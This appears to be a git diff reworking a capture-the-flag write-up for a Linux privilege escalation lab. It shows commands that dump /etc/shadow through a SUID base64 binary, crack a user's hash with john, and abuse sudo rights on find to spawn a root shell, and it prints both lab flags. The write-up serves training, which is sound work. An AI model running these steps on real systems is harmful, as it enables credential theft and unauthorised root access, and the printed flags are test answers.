@@ -1,145 +1,119 @@
-# Linux Privilege Escalation Writeup
+# Linux Privilege Escalation – Capstone Lab Writeup
 
-## FLAG 1
+## Challenge Overview
 
-After receiving the SSH credentials for user `leonard`, I logged into the target machine.
+In this Linux privilege escalation challenge, we were provided with SSH credentials for an initial user. From there, the goal was to enumerate the system, escalate privileges using misconfigured permissions, and capture two flags located in different user and root-owned directories.
 
-### Initial Enumeration
+---
 
-- Checked user identity:
+## FLAG 1 – Gaining Access and Enumerating Privileges
 
-![2025-04-30_14-41](https://github.com/user-attachments/assets/841bccd3-d1da-47b7-8bb2-87e5b49cc5dd)
+**Initial Access:**
 
-  ```bash
-  whoami
-  ```
-  Output: `leonard`
+- Logged in via SSH using the provided credentials for user `leonard`.
 
-- Checked sudo permissions:
-  ```bash
-  sudo -l
-  ```
-  Output: User `leonard` cannot run sudo.
+**Enumeration Performed:**
 
-- Checked kernel version:
+```bash
+whoami
+sudo -l
+uname -a
+find / -type f -perm -04000 2>/dev/null
+```
 
-![2025-04-30_14-42](https://github.com/user-attachments/assets/e1585fa5-7c03-466f-bb94-5d570d9e56cd)
+![2025-04-30_14-41](https://github.com/user-attachments/assets/bd852660-cfc6-4558-a69f-55c2eab6f195)
+![2025-04-30_14-42](https://github.com/user-attachments/assets/ba8f03c8-3e98-4f55-a772-e3f116c34b8a)
+![base64](https://github.com/user-attachments/assets/1b37e96b-fcf6-4d71-93f4-851edfe5a839)
 
-  ```bash
-  uname -a
-  ```
-  Output showed kernel version `3.10` (possible CentOS SUID PIE LFI, but this was not pursued).
 
-- Searched for SUID binaries:
+**Findings:**
+- User `leonard` cannot use `sudo`.
+- Kernel version: `3.10`
+- SUID binary discovered: `/usr/bin/base64`
 
-![base64](https://github.com/user-attachments/assets/2f022ead-713b-4599-92fe-bf1f61274cc5)
+**Exploitation via SUID `base64`:**
 
-  ```bash
-  find / -type f -perm -04000 2>/dev/null
-  ```
-  Found: `base64` is available as a SUID binary and executable as root.
+```bash
+export shadows="/etc/shadow"
+base64 $shadows | base64 -d
+```
 
-### Exploiting SUID Base64
+![2025-04-30_14-48](https://github.com/user-attachments/assets/ad7730a0-4354-47f8-ae6f-753872cbdebb)
+![2025-04-30_14-48_1](https://github.com/user-attachments/assets/824edc8b-f924-4ec9-b7ca-7866f0019fee)
 
-- Exported the shadow file path:
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt missy.txt
+```
 
-![2025-04-30_14-48](https://github.com/user-attachments/assets/e0e588f8-3d12-4a36-9ee3-e65fd2825c25)
-![2025-04-30_14-48_1](https://github.com/user-attachments/assets/cf77ff48-dea8-4620-af04-d7450cc4ebe1)
+![2025-04-30_14-53](https://github.com/user-attachments/assets/1cc33718-52b5-400a-9af1-f06c72001bac)
 
-  ```bash
-  export shadows="/etc/shadow"
-  ```
+- Extracted and cracked password hashes for users `missy`, `leonard`, and `root`.
+- Used `john` with `rockyou.txt` to crack the hash for user `missy`.
+- Password discovered: `Password1`
 
-- Encoded and decoded to retrieve password hashes:
-  ```bash
-  base64 $shadows | base64 -d
-  ```
-  This revealed password hashes for `root`, `missy`, and `leonard`.
+**Escalated to user `missy`** via SSH.
 
-- Verified home directories:
+**Sudo permissions:**
 
-![2025-04-30_17-48](https://github.com/user-attachments/assets/d8761082-8faa-46ca-bc95-90b8689406a3)
+```bash
+sudo -l
+```
 
-  ```bash
-  ls /home
-  ```
-  Output: `rootflag`, `missy`, and `leonard`
+![2025-04-30_14-55](https://github.com/user-attachments/assets/ff1f83b8-3fde-4b63-bb8a-6f179b26fd55)
 
-- Saved missy's hash and cracked it using John the Ripper:
 
-![2025-04-30_14-53](https://github.com/user-attachments/assets/25926e87-aa26-43be-be05-a416523b8c71)
+- Result: User `missy` can execute `find` as root.
 
-  ```bash
-  john --wordlist=/usr/share/wordlists/rockyou.txt missy.txt
-  ```
-  Cracked password: `Password1`
+**Locate first flag:**
 
-### Privilege Escalation to Missy
+```bash
+find / -type f -name flag1.txt 2>/dev/null
+```
 
-- Logged in via SSH using missy's credentials.
+- Result: `/home/missy/Documents/flag1.txt`
 
-- Checked sudo permissions:
+![flag1](https://github.com/user-attachments/assets/029a690b-151d-4c79-8fa2-a97d30015478)
 
-![2025-04-30_14-55](https://github.com/user-attachments/assets/02613642-6a09-4c2b-81a0-f42dc8544f4a)
+**Flag 1 obtained.**
 
-  ```bash
-  sudo -l
-  ```
-  Output: `missy` can run `find` as sudo.
+Flag 1: `THM-42828719920544`
 
-- Searched for flag1 using find:
+---
 
-![flag1](https://github.com/user-attachments/assets/d02fab7b-156e-4aaf-b0ef-643d7e50187f)
+## FLAG 2 – Privilege Escalation to Root
 
-  ```bash
-  find / -type f -name flag1.txt 2>/dev/null
-  ```
-  Output: `/home/missy/Documents/flag1.txt`
-
-  Flag: `THM-42828719920544` 
-
-## FLAG 2
-
-After obtaining `flag1.txt`, I proceeded to escalate privileges using the `find` command, which `missy` is allowed to run as `sudo`.
-
-### Exploiting `find` via GTFObins
-
-- From [GTFOBins](https://gtfobins.github.io/gtfobins/find/), we know that the following command can be used to escalate to a root shell:
-
-![2025-04-30_17-46](https://github.com/user-attachments/assets/96f072ed-fed0-44c7-b3c4-766ebc051e11)
+With access as user `missy` and the ability to run `find` with `sudo`, I leveraged a known GTFOBins trick:
 
 ```bash
 sudo find . -exec /bin/sh -p \; -quit
 ```
 
-This command starts a root shell due to the `-p` option preserving privileges.
+- Result: Spawned a root shell.
 
-### Obtaining the Final Flag
+![2025-04-30_17-46](https://github.com/user-attachments/assets/1394ae60-87f2-4a7c-8d18-bd4c7af5f74f)
 
-Once in the root shell:
+**Navigated to rootflag directory and retrieved second flag:**
 
-![2025-04-30_17-47](https://github.com/user-attachments/assets/84d0ec8e-71a4-4789-8d55-42fe08f21cab)
+```bash
+cd ../rootflag
+cat flag2.txt
+```
 
-- Navigated to the `rootflag` directory:
-  ```bash
-  cd ../rootflag
-  ```
+![2025-04-30_17-47](https://github.com/user-attachments/assets/362d567d-63cd-4b4c-bfc9-a908f3f049ad)
 
-- Read the final flag:
-  ```bash
-  cat flag2.txt
-  ```
+**Flag 2 obtained.**
 
-  Flag: `THM-168824782390238` 
+Flag 2: `THM-168824782390238`
 
-This completed the privilege escalation challenge and retrieved `flag2.txt`.
+---
 
 ## Conclusion
 
-This challenge provided a solid walkthrough of Linux privilege escalation techniques, particularly:
+This challenge demonstrated practical Linux privilege escalation concepts including:
 
-- Leveraging SUID binaries like `base64` for accessing restricted files
-- Password cracking using John the Ripper
-- Gaining root access by exploiting misconfigured `sudo` permissions on binaries such as `find`
+- Abuse of SUID binaries to read sensitive files
+- Cracking password hashes using `john`
+- Using `sudo` misconfigurations with `find` for root access
 
-Overall, it was a hands-on exercise that emphasized the importance of proper binary permissions and the dangers of insecure privilege delegation on Linux systems.
+It’s a strong reminder of why system hardening and privilege boundaries are critical for security.
+
